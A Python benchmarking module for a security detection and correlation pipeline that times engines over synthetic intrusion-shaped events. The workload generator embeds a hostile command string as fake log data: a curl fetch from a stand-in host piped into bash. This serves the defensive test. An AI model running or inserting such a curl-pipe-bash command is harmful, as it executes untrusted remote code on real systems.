"""Throughput and latency benchmarks (Phase 8).

Two different measurements live here, and confusing them would make both
useless:

* **Throughput** -- how many synthetic events per second the detection and
  correlation engines process.  Measured over a bounded workload, with a
  monotonic clock for wall time, :func:`time.process_time` for CPU time, and
  :mod:`tracemalloc` for the allocation high-water mark of the run itself.
* **Latency** -- how long each pipeline stage takes for *one* incident, from
  event generation through detection, correlation and the AI reading.

Neither has anything to do with the timestamps on the events.  Those are
synthetic log times: a scenario whose events span four minutes is not a
four-minute benchmark.  Every performance number in this module comes from
:func:`time.perf_counter`.

**Bounded by construction.**  The workload generator builds a list of events
and the caller says how many; :data:`MAX_EVENTS` caps it so a mistyped argument
cannot exhaust memory.  Nothing here benchmarks the real firewall, the kernel
probes, or a language-model provider -- those are either unavailable offline or
would measure someone else's system rather than SentinelForge's.
"""

from __future__ import annotations

import platform
import sys
import time
import tracemalloc
from dataclasses import dataclass, field
from datetime import datetime
from typing import Sequence

from ..ai.analyst import AISocAnalyst, AnalystConfig
from ..ai.cache import NullAnalysisCache
from ..ai.client import LLMClient, LLMConfig
from ..ai.providers.mock import MockProvider
from ..correlation.engine import CorrelationEngine
from ..detection.engine import DetectionEngine
from ..models.event import SecurityEvent
from .scenario import (
    BASE_TIME,
    INTERNAL_IP,
    network_connection,
    process_start,
    ssh_failure,
    ssh_success,
    sudo_command,
)
from .scenarios import get_scenario

#: Hard ceiling on a workload.  Ten million events is not a benchmark, it is an
#: out-of-memory error with extra steps.
MAX_EVENTS = 200_000

#: The workload sizes ``sentinelforge benchmark`` sweeps by default.
DEFAULT_SIZES = (100, 1_000, 10_000)

#: Events produced by one cycle of the workload template.
CYCLE_EVENTS = 10


def synthetic_workload(count: int, base: datetime | None = None) -> list[SecurityEvent]:
    """Build a bounded, deterministic benchmark workload.

    The template is one intrusion-shaped cycle of ten events -- six failed
    logins, a success, a sudo command, a process execution and an outbound
    connection -- repeated with a rotating attacker address so that alert
    volume scales with event volume instead of collapsing into one deduplicated
    finding.  That makes the throughput figure a measurement of the engines
    doing work, not of them skipping it.

    Args:
        count: How many events to generate (clamped to ``1..MAX_EVENTS``).
        base: Base timestamp; fixed by default, so the workload is identical
            from run to run.

    Returns:
        Exactly ``count`` events, in log order.
    """
    count = max(1, min(int(count), MAX_EVENTS))
    base = base or BASE_TIME
    events: list[SecurityEvent] = []
    cycle = 0
    while len(events) < count:
        # Rotate through the RFC 5737 TEST-NET-3 range: .1 through .250.
        attacker = f"203.0.113.{cycle % 250 + 1}"
        user = f"user{cycle % 17}"
        start = cycle * 600.0  # ten minutes of synthetic log time per cycle
        pid = 10_000 + (cycle % 5_000) * 4
        batch = [
            *[ssh_failure(start + i * 20, base, attacker, user) for i in range(6)],
            ssh_success(start + 140, base, attacker, user),
            sudo_command(start + 200, base, f"/usr/bin/curl http://198.51.100.9/{cycle}.sh | bash", user),
            process_start(
                start + 220, base, process="sh", pid=pid + 1, ppid=pid, parent="curl",
                command_line="sh", user=user, executable="/usr/bin/sh",
            ),
            network_connection(
                start + 240, base, process="sh", pid=pid + 1,
                destination_ip="198.51.100.9", destination_port=443, user=user,
                source_ip=INTERNAL_IP,
            ),
        ]
        events.extend(batch[: count - len(events)])
        cycle += 1
    return events


@dataclass
class ThroughputResult:
    """One workload size, measured.

    Attributes:
        events: How many events were fed in.
        alerts / incidents: What the engines produced from them.
        detection_ms / correlation_ms: Wall time per stage, monotonic clock.
        cpu_seconds: CPU time consumed by this process during the run.
        peak_allocated_kb: Python allocation high-water mark *during this run*
            (``tracemalloc``), which is attributable; unlike process RSS, which
            is a whole-process high-water mark and is reported separately.
        process_peak_rss_kb: ``ru_maxrss`` for the whole process, or ``None``
            where the platform does not provide it.  Never attributed to the
            run alone.
    """

    events: int
    alerts: int
    incidents: int
    detection_ms: float
    correlation_ms: float
    cpu_seconds: float
    peak_allocated_kb: float
    process_peak_rss_kb: float | None = None
    memory_measured: bool = True

    @property
    def total_ms(self) -> float:
        return self.detection_ms + self.correlation_ms

    @property
    def events_per_second(self) -> float:
        return self.events / max(self.total_ms / 1000.0, 1e-9)

    @property
    def detection_events_per_second(self) -> float:
        return self.events / max(self.detection_ms / 1000.0, 1e-9)

    @property
    def alerts_per_second(self) -> float:
        return self.alerts / max(self.total_ms / 1000.0, 1e-9)

    @property
    def microseconds_per_event(self) -> float:
        return self.total_ms * 1000.0 / max(self.events, 1)

    @property
    def alert_rate(self) -> float:
        """Alerts raised per event, i.e. how noisy this workload was."""
        return self.alerts / max(self.events, 1)

    def to_dict(self) -> dict:
        return {
            "events": self.events,
            "alerts": self.alerts,
            "incidents": self.incidents,
            "detection_ms": round(self.detection_ms, 3),
            "correlation_ms": round(self.correlation_ms, 3),
            "total_ms": round(self.total_ms, 3),
            "events_per_second": round(self.events_per_second, 1),
            "detection_events_per_second": round(self.detection_events_per_second, 1),
            "alerts_per_second": round(self.alerts_per_second, 1),
            "microseconds_per_event": round(self.microseconds_per_event, 2),
            "alert_rate": round(self.alert_rate, 4),
            "cpu_seconds": round(self.cpu_seconds, 4),
            "peak_allocated_kb": (
                round(self.peak_allocated_kb, 1) if self.memory_measured else None
            ),
            "memory_measured": self.memory_measured,
            "process_peak_rss_kb": (
                round(self.process_peak_rss_kb, 1) if self.process_peak_rss_kb else None
            ),
        }


def _peak_rss_kb() -> float | None:
    """Process high-water RSS in kilobytes, where the platform offers it."""
    try:
        import resource
    except ImportError:  # pragma: no cover - non-POSIX
        return None
    usage = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
    # Linux reports kilobytes; macOS reports bytes.
    return float(usage) if sys.platform != "darwin" else float(usage) / 1024.0


def measure_throughput(
    count: int, base: datetime | None = None, measure_memory: bool = True
) -> ThroughputResult:
    """Run one bounded workload through detection and correlation, and time it.

    The workload is built *before* the clock starts, so generation cost is not
    counted as pipeline cost.

    Timing and memory are measured in **separate passes**, because
    :mod:`tracemalloc` instruments every allocation and can cost several times
    the run itself.  Timing the instrumented pass would report SentinelForge as
    several times slower than it is, so the timed pass runs uninstrumented and
    a second pass -- whose timings are discarded -- produces the allocation
    figure.  ``measure_memory=False`` skips that second pass entirely and
    leaves ``peak_allocated_kb`` at zero.
    """
    events = synthetic_workload(count, base)

    cpu_started = time.process_time()
    started = time.perf_counter()
    alerts = DetectionEngine().run(events)
    detection_ms = (time.perf_counter() - started) * 1000.0

    started = time.perf_counter()
    incidents = CorrelationEngine().run(alerts)
    correlation_ms = (time.perf_counter() - started) * 1000.0
    cpu_seconds = time.process_time() - cpu_started

    peak_kb = 0.0
    if measure_memory:
        peak_kb = _measure_peak_allocation(events) / 1024.0

    return ThroughputResult(
        events=len(events),
        alerts=len(alerts),
        incidents=len(incidents),
        detection_ms=detection_ms,
        correlation_ms=correlation_ms,
        cpu_seconds=cpu_seconds,
        peak_allocated_kb=peak_kb,
        process_peak_rss_kb=_peak_rss_kb(),
        memory_measured=measure_memory,
    )


def _measure_peak_allocation(events: Sequence[SecurityEvent]) -> float:
    """Peak bytes allocated while processing ``events``.  Timings here are void."""
    tracemalloc.start()
    try:
        CorrelationEngine().run(DetectionEngine().run(events))
        _current, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    return float(peak)


@dataclass
class LatencyResult:
    """Per-stage latency for a single incident, measured on a monotonic clock.

    ``ai_ms`` is the **offline mock provider**.  A hosted model is a network
    call measured in hundreds or thousands of milliseconds and is not
    benchmarked here, because timing someone else's API would say nothing about
    SentinelForge.  The report labels this explicitly rather than letting a
    small number imply a fast language model.
    """

    scenario_id: str
    generation_ms: float
    detection_ms: float
    correlation_ms: float
    ai_ms: float
    events: int
    alerts: int
    incidents: int
    ai_provider: str = "mock"

    @property
    def pipeline_ms(self) -> float:
        """Detection plus correlation: the deterministic path, end to end."""
        return self.detection_ms + self.correlation_ms

    @property
    def total_ms(self) -> float:
        return self.pipeline_ms + self.ai_ms

    def to_dict(self) -> dict:
        return {
            "scenario_id": self.scenario_id,
            "events": self.events,
            "alerts": self.alerts,
            "incidents": self.incidents,
            "generation_ms": round(self.generation_ms, 3),
            "event_to_alert_ms": round(self.detection_ms, 3),
            "alert_to_incident_ms": round(self.correlation_ms, 3),
            "incident_to_ai_ms": round(self.ai_ms, 3),
            "deterministic_pipeline_ms": round(self.pipeline_ms, 3),
            "total_ms": round(self.total_ms, 3),
            "ai_provider": self.ai_provider,
            "ai_note": (
                "the offline mock provider; a hosted model adds a network "
                "round trip that this benchmark deliberately does not measure"
            ),
        }


def measure_latency(scenario_id: str = "full-attack", base: datetime | None = None) -> LatencyResult:
    """Time one scenario stage by stage: event -> alert -> incident -> analysis."""
    scenario = get_scenario(scenario_id)

    started = time.perf_counter()
    events = scenario.events(base or BASE_TIME)
    generation_ms = (time.perf_counter() - started) * 1000.0

    started = time.perf_counter()
    alerts = DetectionEngine().run(events)
    detection_ms = (time.perf_counter() - started) * 1000.0

    started = time.perf_counter()
    incidents = CorrelationEngine().run(alerts)
    correlation_ms = (time.perf_counter() - started) * 1000.0

    ai_ms = 0.0
    if incidents:
        analyst = AISocAnalyst(
            LLMClient(MockProvider(), LLMConfig(), sleep=lambda _: None),
            AnalystConfig(),
            cache=NullAnalysisCache(),
        )
        started = time.perf_counter()
        analyst.analyze(incidents[0])
        ai_ms = (time.perf_counter() - started) * 1000.0

    return LatencyResult(
        scenario_id=scenario_id,
        generation_ms=generation_ms,
        detection_ms=detection_ms,
        correlation_ms=correlation_ms,
        ai_ms=ai_ms,
        events=len(events),
        alerts=len(alerts),
        incidents=len(incidents),
    )


@dataclass
class BenchmarkReport:
    """Everything one ``sentinelforge benchmark`` run measured."""

    throughput: list[ThroughputResult] = field(default_factory=list)
    latency: LatencyResult | None = None
    environment: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "environment": self.environment,
            "throughput": [item.to_dict() for item in self.throughput],
            "latency": self.latency.to_dict() if self.latency else None,
            "notes": [
                "Wall time is measured with time.perf_counter (monotonic); event "
                "timestamps are synthetic log times and are never used as timings.",
                "Timing and memory are measured in separate passes: tracemalloc "
                "instruments every allocation and would inflate the timings, so the "
                "timed pass runs uninstrumented.",
                "peak_allocated_kb is the Python allocation high-water mark of a "
                "second, untimed pass over the same workload (tracemalloc). "
                "process_peak_rss_kb is the whole process's and is not attributable "
                "to the run.",
                "No kernel probe, firewall or hosted model is exercised.",
            ],
        }


def describe_environment() -> dict:
    """What the numbers were measured on.  A benchmark without this is a rumour."""
    return {
        "python": platform.python_version(),
        "implementation": platform.python_implementation(),
        "system": platform.system(),
        "release": platform.release(),
        "machine": platform.machine(),
        "processor": platform.processor() or "unknown",
        "measured_at": datetime.now().astimezone().isoformat(timespec="seconds"),
    }


def run_benchmark(
    sizes: Sequence[int] = DEFAULT_SIZES,
    latency_scenario: str = "full-attack",
    base: datetime | None = None,
    measure_memory: bool = True,
) -> BenchmarkReport:
    """Sweep the workload sizes and measure one scenario's stage latency."""
    return BenchmarkReport(
        throughput=[measure_throughput(size, base, measure_memory) for size in sizes],
        latency=measure_latency(latency_scenario, base),
        environment=describe_environment(),
    )
